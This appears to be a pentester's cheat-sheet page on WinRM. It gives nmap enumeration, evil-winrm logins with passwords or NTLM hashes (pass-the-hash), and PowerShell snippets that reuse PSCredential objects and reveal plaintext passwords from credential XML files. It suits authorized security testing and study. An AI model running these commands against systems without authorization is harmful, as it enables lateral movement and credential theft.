+++
title = "🪟 WinRM: TCP 5985/5986"
+++

- `TCP 5985/5986`: via HTTP/HTTPS respectively
- Requires **1 of**:
    - Local administrator
    - Member of the `Remote Management Users` group
    - Domain Admin (inherits local admin)
    - explicit permissions for PowerShell Remoting in the session configuration

```bash
# Enum via nmap
sudo nmap --disable-arp-ping -n -Pn -sV -sC -p5985,5986 <TARGET>
```

- https://github.com/Hackplayers/evil-winrm

```bash
evil-winrm -u <USER> -p <PASSWORD> -i <HOST>
evil-winrm -u <USER> -H <PASS_HASH> -i <HOST>
```

### PowerShell Remoting/PSCredential Reuse

*Requires valid Kerberos Ticket (PtT) or active NTLM Injection (PtH) in the current session.*

**Requirements**
- WinRM Enabled
- One of the following:
    - `Administrator` **OR**
    - Member of `Remote Management Users` **OR**
    - Explicit PSSession configuration (created with `Register-PSSessionConfiguration`)

- NOTE: PSCredential XML files can only be decrypted by the user who created them on the same machine because the DPAPI keys encrypt the credentials

#### via Plaintext Credentials

```powershell
$secpassword = ConvertTo-SecureString -AsPlainText -Force '<PASSWORD>'
$cred = New-Object System.Management.Automation.PSCredential '<USER>', $secpassword

New-PSSession -Credential $cred -ComputerName <TARGET>
Enter-PSSession -Id <SESSION_ID>
```

#### via XML File

```powershell
$cred = Import-CliXml -Path <PATH_TO_XML>

# Inspect (encrypted w/ user's DPAPI key)
$cred.Username
$cred.GetNetworkCredential().Password

# Open session
New-PSSession -Credential $cred -ComputerName <TARGET>
Enter-PSSession -Id <SESSION_ID>
```
